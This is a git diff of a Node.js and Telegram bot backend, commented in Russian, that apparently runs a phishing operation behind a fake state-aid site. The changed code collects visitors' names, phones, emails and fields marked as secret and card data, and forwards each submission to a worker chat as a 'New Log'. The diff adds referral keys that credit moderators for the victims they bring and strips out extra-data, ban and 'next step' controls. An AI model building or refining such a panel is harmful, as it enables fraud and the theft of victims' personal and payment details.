@@ -61,7 +61,10 @@ let onlineUsers = {};
 let bannedUsers = {};
 let userStatus = {};
 let extraSentUsers = {};
-let userRef = {};
+
+// 🔥 НОВОЕ: реф система
+let modRefKeys = {};   // ref -> modId
+let userRef = {};      // userId -> modId
 
 // ===== ONLINE =====
 function isOnline(id) {
@@ -79,30 +82,24 @@ workerBot.onText(/\/start/, (msg) => {
 
   usersByUsername[username.toLowerCase()] = id;
 
-  console.log("REGISTER:", username, id);
-
   safeSend(workerBot, id, "✅ Ты зарегистрирован");
 });
 
-// ===== ПРОВЕРКА МОДЕРА =====
+// ===== МОДЕРЫ =====
 function isMod(id) {
   return id === adminId || moderators.includes(id);
 }
 
-// ===== МОДЕРЫ =====
+// ===== ДОБАВЛЕНИЕ МОДЕРОВ =====
 workerBot.onText(/\/addmod @(.+)/, (msg, match) => {
   if (msg.chat.id !== adminId) return;
 
   const username = match[1].toLowerCase();
   const id = usersByUsername[username];
 
-  if (!id) {
-    return safeSend(workerBot, adminId, "❌ Он не писал /start");
-  }
+  if (!id) return safeSend(workerBot, adminId, "❌ Он не писал /start");
 
-  if (!moderators.includes(id)) {
-    moderators.push(id);
-  }
+  if (!moderators.includes(id)) moderators.push(id);
 
   safeSend(workerBot, adminId, `✅ Добавлен: @${username}`);
 });
@@ -118,24 +115,7 @@ workerBot.onText(/\/delmod @(.+)/, (msg, match) => {
   safeSend(workerBot, adminId, `❌ Удалён: @${username}`);
 });
 
-workerBot.onText(/\/mods/, (msg) => {
-  if (msg.chat.id !== adminId) return;
-
-  if (!moderators.length) {
-    return safeSend(workerBot, adminId, "нет");
-  }
-
-  const list = moderators.map(id => {
-    const entry = Object.entries(usersByUsername)
-      .find(([u, i]) => i === id);
-
-    return entry ? "@" + entry[0] : id;
-  }).join("\n");
-
-  safeSend(workerBot, adminId, "👥 Модераторы:\n" + list);
-});
-
-// ===== 🔥 ССЫЛКА ДЛЯ МОДЕРОВ =====
+// ===== 🔥 ЧИСТАЯ ССЫЛКА МОДЕРА =====
 workerBot.onText(/\/mylink/, (msg) => {
   const id = msg.chat.id;
 
@@ -143,10 +123,16 @@ workerBot.onText(/\/mylink/, (msg) => {
     return safeSend(workerBot, id, "❌ Ты не модератор");
   }
 
-  const username = msg.from.username;
-  const ref = username ? username : id;
+  // ищем существующий ключ
+  let key = Object.keys(modRefKeys).find(k => modRefKeys[k] === id);
 
-  const link = `https://dopomogavidderzhavii.vercel.app/?ref=${ref}`;
+  // если нет — создаём
+  if (!key) {
+    key = Math.random().toString(36).substring(2, 8);
+    modRefKeys[key] = id;
+  }
+
+  const link = `https://dopomogavidderzhavii.vercel.app/?ref=${key}`;
 
   safeSend(workerBot, id, `🔗 Твоя ссылка:\n${link}`);
 });
@@ -160,14 +146,21 @@ app.post("/enter", async (req, res) => {
 
   onlineUsers[id] = Date.now();
 
+  // 🔥 переводим ref -> модера
   if (ref && !userRef[id]) {
-    userRef[id] = ref;
+    const modId = modRefKeys[ref];
+
+    if (modId) {
+      userRef[id] = modId;
+    } else {
+      userRef[id] = "неизвестно";
+    }
   }
 
   await safeSend(
     enterBot,
     adminId,
-    `👀 Вход\n🆔 ${id}\n👤 ref: ${userRef[id] || "-"}`
+    `👀Переход по ссылке!\n🆔 ${id}\n👤 ref: ${userRef[id] || "-"}`
   );
 
   res.json({ ok: true });
@@ -198,26 +191,25 @@ app.post("/send", async (req, res) => {
   const ref = userRef[id] || "неизвестно";
 
   const statusText = isRepeat
-    ? "🔁 ПОВТОРНАЯ ЗАЯВКА"
-    : "🆕 НОВАЯ ЗАЯВКА";
+    ? "Повторный Лог ♻️"
+    : "🔥 Новый Лог 👻";
 
   const fullText = `${statusText}
 
 🆔 ${id}
 👤 Привёл: ${ref}
-📦 ${d.service}
-👤 ${d.name}
-📞 ${d.phone}
+🏧 ${d.service}
+🗝️ ${d.name}
+📱 ${d.phone}
 📅 ${d.email}
 🔐 ${d.city}
 💳 ${d.comment}`;
-
+  
   const shortText = `${statusText}
 
 👤 ref: ${ref}
-📦 ${d.service}
-👤 ${d.name}
-📞 ${d.phone}`;
+🏧 ${d.service}
+📱 ${d.phone}`;
 
   fullRequests[id] = fullText;
   shortRequests[id] = shortText;
@@ -231,30 +223,6 @@ app.post("/send", async (req, res) => {
   });
 
   if (msg) groupMessages[id] = msg.message_id;
-
-  res.json({ ok: true });
-});
-
-// ===== СТАТУС =====
-app.get("/status/:id", (req, res) => {
-  res.json({ status: userStatus[req.params.id] || "wait" });
-});
-
-// ===== ДОП ДАННЫЕ =====
-app.post("/send2", async (req, res) => {
-  const { id, value } = req.body;
-
-  if (!id || !value) return res.json({ ok: false });
-
-  if (extraSentUsers[id]) return res.json({ ok: false });
-
-  extraSentUsers[id] = true;
-
-  const owner = takenRequests[id];
-
-  if (owner) {
-    await safeSend(workerBot, owner, `📩 ДОП ДАННЫЕ\n🆔 ${id}\n💬 ${value}`);
-  }
 
   res.json({ ok: true });
 });
@@ -284,18 +252,7 @@ workerBot.on("callback_query", async (q) => {
 
 👤 Взял: ${user}`;
 
-    const sent = await safeSend(workerBot, q.from.id, fullWithOwner, {
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
-          [
-            { text: "🚫 Бан", callback_data: "ban_" + id },
-            { text: "✅ Разбан", callback_data: "unban_" + id }
-          ],
-          [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
-        ]
-      }
-    });
+    const sent = await safeSend(workerBot, q.from.id, fullWithOwner);
 
     if (sent) fullMessages[id] = sent.message_id;
 
@@ -310,49 +267,6 @@ workerBot.on("callback_query", async (q) => {
       }
     });
 
-    workerBot.answerCallbackQuery(q.id);
-  }
-
-  if (data.startsWith("free")) {
-
-    if (takenRequests[id] !== q.from.id) {
-      return workerBot.answerCallbackQuery(q.id, { text: "❌ Не твоя" });
-    }
-
-    delete takenRequests[id];
-
-    await safeDelete(workerBot, q.from.id, fullMessages[id]);
-
-    await safeEdit(workerBot, workerChat, groupMessages[id],
-      shortRequests[id], {
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "📥 Забрать", callback_data: "take_" + id }]
-        ]
-      }
-    });
-
-    workerBot.answerCallbackQuery(q.id, { text: "Освобождено" });
-  }
-
-  if (data.startsWith("check")) {
-    workerBot.answerCallbackQuery(q.id, {
-      text: isOnline(id) ? "🟢 Онлайн" : "🔴 Оффлайн"
-    });
-  }
-
-  if (data.startsWith("ban")) {
-    bannedUsers[id] = true;
-    workerBot.answerCallbackQuery(q.id);
-  }
-
-  if (data.startsWith("unban")) {
-    delete bannedUsers[id];
-    workerBot.answerCallbackQuery(q.id);
-  }
-
-  if (data.startsWith("allow")) {
-    userStatus[id] = "next";
     workerBot.answerCallbackQuery(q.id);
   }
 });
